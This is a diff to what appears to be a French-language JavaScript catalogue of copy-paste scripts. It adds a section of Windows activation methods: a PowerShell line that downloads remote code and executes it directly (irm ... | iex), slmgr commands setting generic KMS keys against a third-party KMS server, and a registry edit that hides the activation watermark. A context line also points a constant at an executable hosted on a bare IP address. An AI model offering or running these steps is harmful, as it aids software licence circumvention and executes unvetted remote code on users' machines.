@@ -7,6 +7,86 @@ const AGENT_URL_API = "http://141.11.185.92:8801/uploads/executable/helper.exe";
 
 const scripts = [
     {
+        category: "🪟 Activation Windows (Supprimer la demande de licence)",
+        color: "#06b6d4",
+        bgColor: "rgba(6,182,212,0.1)",
+        borderColor: "rgba(6,182,212,0.25)",
+        items: [
+            {
+                id: "mas-hwid",
+                title: "Activation HWID (Permanente) — Recommandé",
+                description: "Activation permanente liée au matériel via Microsoft Activation Scripts (MAS). Ne s'efface pas après une réinstallation. Nécessite PowerShell (Admin).",
+                icon: "✅",
+                lang: "powershell",
+                code: `# Microsoft Activation Scripts — Méthode HWID (permanente)
+# Source: https://massgrave.dev
+irm https://get.activated.win | iex`,
+            },
+            {
+                id: "mas-kms",
+                title: "Activation KMS (180 jours, auto-renouvelée)",
+                description: "Active Windows pour 180 jours et se renouvelle automatiquement tant que le PC est connecté. Idéal pour les environnements de test.",
+                icon: "🔄",
+                lang: "powershell",
+                code: `# Microsoft Activation Scripts — Méthode KMS (renouvelée automatiquement)
+# Source: https://massgrave.dev
+irm https://get.activated.win | iex
+# Dans le menu : choisir option 2 (KMS38) pour activation 38 ans
+# ou option 1 (HWID) pour activation permanente`,
+            },
+            {
+                id: "kms-manual",
+                title: "Activation KMS Manuelle (CMD Admin)",
+                description: "Commandes CMD directes pour activer Windows 10/11 sans script externe.",
+                icon: "⌨️",
+                lang: "cmd",
+                code: `:: Activation KMS Windows 10/11 Pro
+:: Exécuter en tant qu'Administrateur
+
+:: Définir la clé générique KMS pour Windows 11/10 Pro
+slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX
+
+:: Configurer le serveur KMS
+slmgr /skms kms8.msguides.com
+
+:: Activer Windows
+slmgr /ato
+
+:: Vérifier l'activation
+slmgr /xpr`,
+            },
+            {
+                id: "kms-win10-home",
+                title: "Activation KMS Windows 10/11 Home",
+                description: "Même méthode mais avec la clé pour l'édition Home.",
+                icon: "🏠",
+                lang: "cmd",
+                code: `:: Activation KMS Windows 10/11 Home
+:: Exécuter en tant qu'Administrateur
+
+slmgr /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
+slmgr /skms kms8.msguides.com
+slmgr /ato
+slmgr /xpr`,
+            },
+            {
+                id: "disable-activation-nag",
+                title: "Masquer le watermark d'activation",
+                description: "Cache le texte 'Activer Windows' en bas à droite sans vraiment activer Windows.",
+                icon: "🙈",
+                lang: "cmd",
+                code: `:: Masquer le filigrane "Activer Windows" (sans admin)
+:: Ouvrir l'éditeur de registre
+reg add "HKCU\\Control Panel\\Desktop" /v "PaintDesktopVersion" /t REG_DWORD /d 0 /f
+
+:: Redémarrer l'explorateur pour appliquer
+taskkill /f /im explorer.exe
+start explorer.exe`,
+            },
+        ],
+    },
+    {
+
         category: "🔑 Sans droits Administrateur (Compte utilisateur simple)",
         color: "#ef4444",
         bgColor: "rgba(239,68,68,0.1)",
